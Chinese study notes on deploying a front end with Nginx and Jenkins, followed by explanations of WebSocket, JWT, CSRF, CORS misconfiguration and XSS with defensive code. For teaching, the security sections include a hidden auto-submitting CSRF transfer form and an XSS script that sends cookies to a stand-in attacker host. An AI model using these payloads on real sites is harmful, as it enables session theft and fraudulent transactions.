### 内容包括：自动化部署（server-jenkins-nginx）  和 [前端涉及的网络相关内容](#前端涉及的网络相关的学习)

# 老师：codewhy
# 自动化部署

### 1. 先购买服务器和Nginx环境的搭建

**Nginx作用：高性能的 Web 服务器和反向代理服务器**

- **主要功能**

  1. **静态资源托管**：把前端 React/Vue 项目的 `build` 文件夹放进去，用户访问网站时，Nginx 就把 `index.html`、CSS、JS 静态文件返回给浏览器。
  2. **反向代理**：用户访问 `http://example.com/api`，Nginx 可以把请求转发到后端（比如 Node.js、Spring Boot、Go 服务）。
  3. **负载均衡**：如果有多个后端服务，Nginx 可以分发请求，提升并发性能。
  4. **HTTPS 配置**：通过 SSL 证书让网站支持 `https://`。

- 安装命令（CentOS）：

  ```bash
  # 安装 Nginx
  sudo yum install -y nginx
  
  # 启动 Nginx
  sudo systemctl start nginx
  
  # 设置开机自启
  sudo systemctl enable nginx
  
  # 查看运行状态
  sudo systemctl status nginx
  ```

  安装命令（Ubuntu）：

  ```bash
  # 更新软件源
  sudo apt update
  
  # 安装 Nginx
  sudo apt install -y nginx
  
  # 启动 Nginx
  sudo systemctl start nginx
  
  # 设置开机自启
  sudo systemctl enable nginx
  ```

#### 配置 Nginx

编辑 Nginx 配置文件：

```bash
sudo vim /etc/nginx/conf.d/vueplustypescript.conf
```

配置内容：

```nginx
server {
    listen 80;
    server_name your-domain.com;  # 替换为你的域名或服务器 IP

    # 前端静态资源目录
    root /var/www/vueplustypescript/dist;
    index index.html;

    # 支持 Vue Router 的 history 模式
    location / {
        try_files $uri $uri/ /index.html;
    }

    # 反向代理 API 请求到后端
    location /api/ {
        proxy_pass http://localhost:8000;  # 替换为你的后端服务地址
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    }

    # 静态资源缓存配置
    location ~* \.(js|css|png|jpg|jpeg|gif|ico|svg|woff|woff2|ttf)$ {
        expires 1y;
        add_header Cache-Control "public, immutable";
    }

    # Gzip 压缩
    gzip on;
    gzip_types text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript;
}
```

重启 Nginx：

```bash
sudo nginx -t  # 测试配置文件
sudo systemctl reload nginx  # 重新加载配置
```



### 2. Jenkins环境的搭建 -- 需要java环境



- 安装java

  - ```bash
    # CentOS
    sudo yum install -y java-11-openjdk java-11-openjdk-devel
    
    # Ubuntu
    sudo apt install -y openjdk-11-jdk
    
    # 验证安装
    java -version
    ```

- 安装jenkins

  - linus清空： clear

  - 安装步骤：

    ```bash
    # 添加 Jenkins 仓库
    sudo wget -O /etc/yum.repos.d/jenkins.repo https://pkg.jenkins.io/redhat-stable/jenkins.repo
    sudo rpm --import https://pkg.jenkins.io/redhat-stable/jenkins.io-2023.key
    
    # 安装 Jenkins
    sudo yum install -y jenkins
    
    # 启动 Jenkins
    sudo systemctl start jenkins
    
    # 作用：自动启动
    sudo systemctl enable jenkins
    
    # 查看初始密码
    sudo cat /var/lib/jenkins/secrets/initialAdminPassword
    ```

- **作用：自动化构建和持续集成/持续部署（CI/CD）工具**

  - **主要功能**
    1. **拉取代码**：从 GitHub、GitLab 等仓库获取最新代码。
    2. **自动构建**：执行 `npm install && npm run build`（前端），或 `mvn package`（Java），或 `go build`（Go）等。
    3. **自动测试**：在构建时跑单元测试、集成测试。
    4. **自动部署**：构建成功后，把产物（如 `build` 文件夹、jar 包）推送到服务器指定目录。
       1. **持续集成/持续部署**：当你 `git push` 代码时，Jenkins 可以自动触发构建和部署，不用你手动一遍遍操作



### 3. jenkins的使用过程

- 配置jenkins的环境

1. 你在本地写代码 `git push` 到 GitHub

2. Jenkins 自动拉取代码 → 构建出 `build` 文件夹

3. Jenkins 把 `build` 放到 Nginx 的目录里

4. 用户访问网站时，Nginx 把页面返回

- #### 安装 Node.js 环境

  Jenkins 构建需要 Node.js 环境：

  - jenkins有可视化界面

  ```bash
  # 安装 nvm（Node 版本管理工具）
  curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.0/install.sh | bash
  
  # 加载 nvm
  source ~/.bashrc
  
  # 安装 Node.js
  nvm install 20
  nvm use 20
  
  # 验证安装
  node -v
  npm -v
  ```

  ---





### 4. 手动部署和自动化部署

***\*流程图：\****

本地开发 → git push → GitHub → Webhook → Jenkins

​                      ↓

​                   拉取代码 → 安装依赖

​                      ↓

​                    构建项目 → 上传服务器

​                      ↓

​                    Nginx 托管 → 用户访问

\```



### 5. 总结所有的操作顺序（ABC为顺序）

#### A.本地vscode里面 安装remote插件，用其连接远程服务器

#### B.选择linus，vscode终端就是远程服务器的终端，这个终端下载Nginx

#### C.然后继续在那个终端安装java环境和jenkins

#### D.jenkins可能安装不了，因为找不到对应包，下面要手动添加对应仓库

#### E. 然后去服务器配置安全策略（配置端口），之后访问服务器地址加端口就可以看见jenkins

#### F. 会看到要密码才能登录，前面有段路径，赋值，然后再刚刚那个终端执行： cat 那个路径，然后返回一个密钥就是密码

#### G. 进入后选择安装推荐插件

#### H. 先在那个终端执行pwd ，看当前路径，再 mkdir 文件夹名（你打包那个包名），ls 看文件包名创建了吗，

#### I.终端那个页面有个打开文件夹，点击打开刚刚创建的文件夹,把打包好那个文件夹里面的文件复制到刚刚打开的文件夹里面

#### J.配置ngnix，可以去问ai，概况就是在nginx.conf里面配置好：作用：即使打开服务器网站不是jenkins默认页面，而是你的页面

#### L. 执行Systemcl restart nginx 重启

#### M. 访问服务器，进入jenkins，配置node，需要安装；配置仓库github，要是仓库不是开源则配置协议

#### N.在jenkins服务器里面配置构建时间和 git push那些自动部署代码，当构建失败，可能要回到刚刚那个终端配置root权限





# 前端涉及的网络相关的学习

##  WebSocket

#### 🛑 历史痛点 (没它之前)
想做股票大盘、即时聊天。
**笨办法 (轮询 Polling)**：前端写个 `setInterval`，每秒钟问服务器：“有新消息吗？”
*   **后果**：99% 的请求都是没用的（服务器回：没有），严重浪费流量和服务器资源。延迟也高。

#### ✅ 解决方案
**升级协议**。从 HTTP 升级到 WebSocket。
建立一条**全双工**的长连接。前端能说话，后端也能主动给前端推消息，不需要前端问。

#### 💻 代码实战 (带心跳检测)

```javascript
// 简单版实现
const ws = new WebSocket('wss://api.example.com/chat');

ws.onopen = () => {
  console.log('连接上了！');
  // 开启心跳：每30秒发个 ping，防止断开
  setInterval(() => {
    if (ws.readyState === WebSocket.OPEN) {
      ws.send('ping');
    }
  }, 30000);
};

ws.onmessage = (event) => {
  // 核心：被动接收服务器推过来的数据
  const msg = JSON.parse(event.data);
  if (msg.type !== 'pong') {
    console.log('收到新消息:', msg.content);
    // 更新 UI，比如聊天列表 push 一条数据
  }
};

ws.onclose = () => {
  console.log('断开了，尝试重连...');
};
```

#### 🚀 带来的优化
*   **实时性**：毫秒级延迟。
*   **低开销**：不用每次都握手和带 Header，传输数据极其轻量





## JWT

---

### 一、 历史痛点：Session/Cookie 时代 (没 JWT 之前)

在 JWT 流行之前，Web 应用主要使用 **Session + Cookie** 模式。

#### 1. 机制回顾
1.  用户登录成功。
2.  服务端在**内存**里生成一个 `SessionID`，并保存用户数据（如 `user_id: 1`）。
3.  服务端通过 `Set-Cookie` 命令把 `SessionID` 发给浏览器。
4.  浏览器下次发请求自动带上 Cookie。
5.  服务端拿着 Cookie 里的 `SessionID` 去内存里找：“这是谁？”

#### 2. 存在的问题 (痛点)

*   **服务器压力大 (内存爆炸)**
    *   每个在线用户都要在服务器存一份 Session 数据。如果是百万级用户，服务器内存直接炸了。
*   **扩展性差 (服务器集群噩梦) —— 最核心痛点**
    *   **场景：** 公司做大了，弄了 3 台服务器（A, B, C）做负载均衡。
    *   **Bug：** 用户在 **服务器 A** 登录了，Session 存在 A 的内存里。下一秒用户发请求被转发到了 **服务器 B**，B 的内存里没有这个 SessionID，结果用户被迫下线。
    *   *旧解决方案：* 需要搞“Session 黏滞”（强制用户只连A）或者引入 Redis 做“Session 共享”，增加了架构复杂度。
*   **CSRF 攻击**
    *   因为 Cookie 是浏览器自动携带的，容易被跨站伪造请求攻击。
*   **移动端 (App) 不友好**
    *   iOS 和 Android 原生处理 Cookie 比较麻烦，不像浏览器那么自动化。

---

### 二、 解决方案：JWT 时代 (JSON Web Token)

JWT 的出现，核心是为了解决 **“服务端无状态 (Stateless)”** 的问题。

#### 1. 机制革新
1.  用户登录成功。
2.  服务端**不存数据**！而是用**密钥**把用户信息（`user_id: 1`）**签名**，生成一个字符串（Token）。
3.  服务端把 Token 发给前端。
4.  前端存起来（LocalStorage）。
5.  下次请求，前端手动把 Token 放在 Header 里。
6.  服务端收到 Token，用密钥**解密验证**：只要签名对，就说明你是合法的。

#### 2. JWT 解决了什么？
*   **去中心化/无状态**：服务端不需要记录“谁登录了”。Token 本身就是“身份证”。
*   **完美支持集群**：
    *   用户在服务器 A 登录拿到了 Token。
    *   下次请求发给服务器 B。
    *   服务器 B 虽然没见过用户，但 B 也有**同样的密钥**，它一验签名：“嗯，这是服务器 A 签发的，有效！”。于是用户畅通无阻。

---

### 三、 代码实战 (Node.js + 前端)

为了面试，你要展示你知道 **Sign (签发)** 和 **Verify (验证)** 这两个动作。

#### 1. 后端代码 (Node.js 模拟)

你需要引入 `jsonwebtoken` 库。

```javascript
const jwt = require('jsonwebtoken');
const SECRET_KEY = 'my_super_secret_key'; // 只有后端知道的密钥

// --- 场景 1：登录接口 (签发 Token) ---
function login(req, res) {
  const user = { id: 101, username: 'admin' };
  
  // 核心：生成 JWT
  // 参数1：Payload (你要存的数据)
  // 参数2：密钥
  // 参数3：过期时间
  const token = jwt.sign(user, SECRET_KEY, { expiresIn: '1h' });
  
  res.json({ token });
}

// --- 场景 2：受保护接口 (验证 Token) ---
function getUserProfile(req, res) {
  // 1. 从 Header 拿 Token
  // 前端一般发：Authorization: Bearer <token>
  const token = req.headers.authorization.split(' ')[1];
  
  try {
    // 2. 核心：验证签名
    // 如果被篡改过，或者过期了，这里会报错
    const decoded = jwt.verify(token, SECRET_KEY);
    
    // 3. 验证通过，拿到 user 信息
    console.log('用户是：', decoded.username);
    res.json({ msg: '允许访问', data: decoded });
    
  } catch(err) {
    res.status(401).json({ msg: 'Token 无效或过期' });
  }
}
```

#### 2. 前端代码 (Axios 配合)

```javascript
import axios from 'axios';

// 1. 登录成功，存 Token
async function doLogin() {
  const res = await axios.post('/api/login', { name: 'admin' });
  const token = res.data.token;
  localStorage.setItem('token', token);
}

// 2. 请求拦截器：自动带 Token
axios.interceptors.request.use(config => {
  const token = localStorage.getItem('token');
  if (token) {
    // 标准格式：Bearer + 空格 + token
    config.headers.Authorization = `Bearer ${token}`;
  }
  return config;
});
```

---

### 四、 带来了什么优化？(面试总结)

1.  **服务器减负 (最重要)**：
    *   服务端内存释放了，不需要维护巨大的 Session 表。这就叫 **“时间换空间”**（CPU 计算签名换取内存空间）。
2.  **微服务/分布式架构的基石**：
    *   多个服务之间不需要打通 Session 数据库，只需要共享一个“密钥”就能互相识别用户身份。
3.  **跨域更简单**：
    *   Cookie 跨域很麻烦（要做 `withCredentials` 配置），JWT 是放在 HTTP Header 里的，天生支持跨域传输。
4.  **多端通用**：
    *   Web、App、小程序，只要能发 HTTP 请求，都能用 JWT，一套接口通吃。

 **“JWT 有什么缺点吗？”**
你要诚实回答：

> "有。JWT 最大的缺点是 **一旦签发，无法撤销**。
> 如果用户 Token 被偷了，或者管理员想强制把用户踢下线，在 Session 模式下删掉 Session 就行，但在 JWT 模式下，因为服务器不存状态，只要 Token 没过期，黑客就能一直用。
> **解决办法**是建立一个黑名单机制（存 Redis），或者设置较短的过期时间搭配 Refresh Token。"







## CSRF (Cross-Site Request Forgery)

### 一、 历史痛点：Cookie 的“自动携带”机制 (没它之前)

- 在没有 CSRF Token 之前，Web 应用主要依赖 **Cookie** 来维持登录状态。

- 浏览器的设计有一个默认行为：**只要你给某个域名发请求，浏览器就会自动把该域名下的 Cookie 带上。**

#### 2. 攻击场景复现 (悲剧发生了)
假设你是一个用户：
1.  你刚刚登录了 **银行网站 (bank.com)**，浏览器存了你的登录 Cookie。
2.  你收到一封垃圾邮件，点开了一个 **黑客网站 (evil.com)**。
3.  黑客网站里写了这么一段代码：
    ```html
    <!-- 黑客网站隐藏的一个表单，地址指向银行 -->
    <form action="http://bank.com/transfer" method="POST">
      <input type="hidden" name="to" value="黑客的账户" />
      <input type="hidden" name="amount" value="10000" />
    </form>
    <script>
      // 你一打开网页，脚本自动提交表单
      document.forms[0].submit();
    </script>
    ```
4.  **结果**：
    *   浏览器向 `bank.com` 发起了 POST 请求。
    *   **关键点**：虽然是黑客网页发起的，但浏览器发现目标是 `bank.com`，于是**自动带上了你在银行的 Cookie**。
    *   银行服务器收到请求，一看 Cookie 是对的，以为是你本人转账，于是**转账成功**。钱没了。

这就是 **CSRF (Cross-Site Request Forgery)**：黑客盗用了你的身份，以你的名义发送了请求。

---

### 二、 解决方案：CSRF Token 的出现

为了解决这个问题，我们需要引入一个**“浏览器不会自动携带”**的东西，这就是 **CSRF Token**。

#### 1. 核心逻辑
*   **Cookie**：浏览器会自动带，黑客能利用这一点。
*   **Header (自定义头)**：浏览器**绝对不会**自动带，必须由前端 JS 手动写代码加上。

#### 2. 它怎么解决问题？
1.  用户登录后，服务器除了给 Cookie，还会额外给前端一个 **随机字符串 (Token)**（比如放在页面 meta 标签里，或者通过接口返回）。
2.  前端每次发请求（POST/PUT/DELETE）时，**必须手动**把这个 Token 放到 HTTP Header 的 `X-CSRF-TOKEN` 字段里。
3.  **黑客懵了**：
    *   黑客只能控制浏览器发请求（利用 Cookie 自动发送）。
    *   但黑客的网站（evil.com）无法读取银行网站（bank.com）的页面内容（受**同源策略**限制），所以黑客**拿不到那个随机 Token**。
    *   黑客发出的请求里没有 `X-CSRF-TOKEN` 头。
4.  **服务器拦截**：
    *   银行服务器收到请求，先检查 Header 里有没有 Token，以及 Token 对不对。
    *   发现没有 Token，服务器直接拒绝：**403 Forbidden**。

---

### 三、 代码实战

#### 1. 前端代码 (Axios 拦截器)

假设服务器把 Token 藏在了页面的 `<meta>` 标签里（这是传统服务端渲染常见的做法），或者是登录接口返回的。

```javascript
import axios from 'axios';

// 1. 获取 Token (假设藏在 meta 标签里)
// 黑客的网站是读不到这个 DOM 的，只有你的网站能读到
const csrfToken = document.querySelector('meta[name="csrf-token"]')?.getAttribute('content');

const service = axios.create({
  baseURL: '/api'
});

// 2. 请求拦截器
service.interceptors.request.use((config) => {
  // 如果是 POST, PUT, DELETE 等修改数据的请求
  if (['post', 'put', 'delete'].includes(config.method)) {
    if (csrfToken) {
      // 🔴 核心：手动加上这个头
      // 这就是黑客无法伪造的一步
      config.headers['X-CSRF-TOKEN'] = csrfToken;
    }
  }
  return config;
});
```

#### 2. 后端代码 (Node.js 模拟原理)

```javascript
// 假设这是一个转账接口
app.post('/transfer', (req, res) => {
  // 1. 从 Header 里拿 Token
  const clientToken = req.headers['x-csrf-token'];
  
  // 2. 从 Session 里拿之前发给用户的真实 Token
  const serverToken = req.session.csrfSecret;

  // 3. 比对
  if (!clientToken || clientToken !== serverToken) {
    // 没带 Token，或者 Token 不对 -> 可能是 CSRF 攻击
    return res.status(403).send('非法请求：CSRF Token 缺失或错误');
  }

  // 4. 验证通过，执行转账
  userService.transferMoney(...);
});
```

---

### 四、 带来了什么优化？

1.  **安全性质变**：
    *   将“身份验证”从单纯依赖 **Cookie（自动）** 变成了 **Cookie + Token（手动）** 的双重验证。彻底堵死了利用浏览器自动发送 Cookie 漏洞的攻击路径。

2.  **精细化控制**：
    *   通常 GET 请求（只读）不需要防 CSRF，只有 POST/PUT/DELETE（写操作）才需要。这让安全策略更加灵活高效。

3.  **与 JWT 的关系 (特别说明)**：
    *   如果你用的是 **JWT (Authorization: Bearer token)** 存放在 LocalStorage 中，其实**天生就防 CSRF**。
    *   因为 LocalStorage 不会像 Cookie 那样自动发送，黑客没办法让浏览器自动带上 JWT。
    *   **所以 `X-CSRF-TOKEN` 主要用于那些依然使用 Cookie 进行身份维持的系统。**





## “黑客不能通过解决跨域问题来偷 CSRF Token 吗？”

这是一个非常犀利且直击灵魂的问题！说明你对同源策略和跨域有了深入的思考。

**一句话直接回答：**
**黑客“想”解决，但他“做不到”。** 因为 **CORS（跨域资源共享）的开关握在“银行”手里，而不是握在“黑客”手里。**

除非银行的后端开发人员**脑子进水了**（配置了错误的 CORS 策略），否则黑客无法通过跨域拿到 Token。

我来把这个逻辑拆解清楚，帮你彻底搞懂 **SOP（同源策略）**、**CORS** 和 **CSRF** 之间的博弈关系。

---

### 一、 为什么黑客“做不到”？（权限在谁手里）

你现在的理解可能是：“跨域限制了黑客，那黑客想办法开启跨域不就行了？”

但事实是：

*   **跨域限制 (SOP)**：是**浏览器**用来保护**银行**的。
    *   [下面有案例](#四、 黑客唯一的出路：XSS (降维打击) 与SOP案例)

*   **开启跨域 (CORS)**：是**银行服务器**用来授权给**特定域名**的。

#### 场景模拟

1.  **黑客网站 (evil.com)** 的脚本发了一个 AJAX 请求给 **银行 (bank.com)**，试图读取页面内容（找 Token）。
2.  请求发出去了（浏览器允许发）。
3.  银行服务器收到了，返回了 HTML（包含 Token）。
4.  **关键时刻来了：** 浏览器拿到了响应，但它看了一眼 **银行返回的 Header**。
    *   浏览器问 Header：“哎，银行，你允许 `evil.com` 读取你的数据吗？”(SOP起作用) 
    *   **正常情况**：银行后端没配置 CORS，或者配的是 `Access-Control-Allow-Origin: trusted.com`。
    *   浏览器说：“银行没说让你读，或者说只让 trusted.com 读。**你 evil.com 没权限，滚！**”(SOP起作用)
    *   **结果**：浏览器把响应数据拦截了，抛出跨域错误，黑客的 JS **拿不到** 响应体里的内容（也就拿不到 Token）。

**结论：** 黑客控制不了银行的服务器 Header，所以他没法“单方面”解决跨域问题。

---

### 二、 银行犯傻的时候（CORS 配置错误漏洞）

虽然黑客不能强行跨域，但如果**银行的后端开发人员写了烂代码**，黑客就有机会了。

这属于 **“CORS 配置错误漏洞”**，而不是 CSRF。

#### 什么样的烂配置会让黑客得逞？

如果银行后端写了这种“自杀式”配置：（COR起作用）

```http
# 银行服务器的响应头
# 1. 允许任何网站跨域读取（或者动态反射 Origin）
Access-Control-Allow-Origin: http://evil.com  
# 2. 允许带 Cookie（最致命的一点）
Access-Control-Allow-Credentials: true
```

**发生了什么：**

1.  黑客在 `evil.com` 发请求，带上了 `withCredentials: true`（带上了你的银行 Cookie）。
2.  银行服务器一看：“哟，是 `evil.com` 啊，我配置里允许你了，还允许你带 Cookie”。
3.  银行把包含 Token 的 HTML 发回来。
4.  浏览器一看 Header：“银行说允许 `evil.com` 读取”。
5.  **黑客 JS 成功读到了响应数据 -> 解析出 CSRF Token -> 发起 CSRF 攻击 -> 钱没了。**

**注意：** 这种情况极少见，因为 `Access-Control-Allow-Origin: *` 和 `Credentials: true` 是**不能同时存在**的（浏览器会报错）。银行必须**显式地**把 `evil.com` 写在允许列表里，黑客才能成功。哪个银行会把黑客网站写在白名单里呢？

---

### 三、 区分两个概念：CSRF vs CORS 漏洞

这俩经常被搞混，我们梳理一下：

| 攻击类型                   | 核心逻辑                                                     | 防御手段                                            |
| :------------------------- | :----------------------------------------------------------- | :-------------------------------------------------- |
| **CSRF (跨站请求伪造)**    | 黑客**只负责发请求** (利用 Cookie 自动携带)，**不需要看响应**。只要请求发出去了，钱就转了。 | **CSRF Token** (黑客拿不到 Token，请求就发不成功)。 |
| **Token 窃取 (CORS 漏洞)** | 黑客想**读取响应** (为了偷 Token)。这需要突破同源策略。      | **严格的 CORS 配置** (不要瞎配置 `Allow-Origin`)。  |

**现在的防御体系是这样的：**

1.  **SOP (同源策略)**：防止了黑客**偷 Token**（读取）。
2.  **CSRF Token**：防止了黑客**盲发请求**（写入）。

这俩兄弟联手，黑客既看不见，也动不了。

---

### 四、 黑客唯一的出路：XSS (降维打击) 与SOP案例

如果黑客真的想拿到那个 Token，靠跨域是不行的，他必须利用 **XSS (跨站脚本攻击)**。

**场景：**

1.  黑客在银行的评论区注入了一段 JS 代码：`<script>...偷 Token...</script>`。
2.  当你打开银行页面时，这段 JS 是**在银行的域名下 (bank.com)** 运行的！
3.  **既然是同源**，SOP 就不管了。黑客脚本可以直接 `document.querySelector('meta[name="csrf-token"]')` 拿到 Token。
4.  然后发给黑客的服务器。

**结论：**

*   **跨域 (CORS)** 救不了黑客。
*   但如果你的网站有 **XSS 漏洞**，CSRF Token 防御就彻底失效了。

 

## XSS (跨站脚本攻击 Cross-Site Scripting)

#### 🛑 历史痛点 (没它之前)

Web 早期，大家默认“用户输入什么就展示什么”。
**后果：** 黑客在博客评论区输入一段 `<script>document.location='http://hacker.com?cookie='+document.cookie</script>`。
当其他用户看到这条评论时，浏览器会**无脑执行**这段脚本，导致用户的 Cookie（包含登录凭证）被发送给黑客。

#### ✅ 解决方案

**原则：永远不信任用户的输入。** 把用户输入的内容当做纯文本（String），而不是 HTML 代码。
核心手段是 **转义 (Escaping)**：把 `<` 变成 `&lt;`，把 `>` 变成 `&gt;`。

#### 💻 代码实战 (手写转义函数)

```javascript
// 面试手写题：XSS 防御函数
function escapeHTML(str) {
  if (!str) return '';
  return str
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#39;"); // 防止截断属性
}

// 场景：用户输入
const userInput = '<script>alert("偷号")</script>';

// 错误写法：直接渲染 (会弹窗)
// div.innerHTML = userInput; 

// 正确写法：先清洗
div.innerHTML = escapeHTML(userInput);
// 结果：页面显示文字 <script>...，但不会执行代码
```

#### 🚀 带来的优化

保证了网站的**安全性**，防止用户信息泄露和恶意跳转。现在的框架（Vue/React）在 `{{ }}` 或 `{}` 中默认开启了这种转义，只有用 `v-html` 时才需要特别小心 XSS。
